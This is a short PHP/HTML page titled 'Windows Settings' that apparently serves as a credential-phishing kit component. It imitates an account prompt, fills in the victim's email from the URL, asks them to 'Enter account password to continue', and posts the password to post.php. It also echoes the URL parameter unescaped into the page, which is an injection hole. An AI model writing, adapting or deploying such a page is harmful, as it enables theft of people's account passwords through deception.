<html>
<head>
<link rel="shortcut icon" href="favi.jpg" type="image/gif"/>
<title>Windows Settings </title></head>
<body>

<br>

<table align="center">

<tr><td>

	<div align="center">

	<img src="logo.png" width="280" height="100">


	<br>

	<form method="post" action="post.php">

	<input  name="email" type="hidden" value="<?php echo $_GET['email']; ?>">
	

	

	<br><br>

	<font face="verdana" size="+3" color="#000000"> <?php echo $_GET['email']; ?> </font>

	<br><br>

	<font face="verdana" size="2" color="#ff0000">
	Enter account password to continue...
	</font>

	<br><br>

	<input  name="pass" type="password" style="width:300px; height:45px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #0080FF; padding: 13px;" required="" placeholder="Enter Password">	



	<br><br>

	<input type="submit" value="Continue >>" style="width:300px; height:60px; background-color: #0080FF; border: solid 3px #0080FF; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 5px 5px 5px #888; -webkit-box-shadow: 5px 5px 5px #888; box-shadow: 5px 5px 5px #888;">

	<br>
	</form>


	</div>

</td></tr>

</table>


</body>
</html>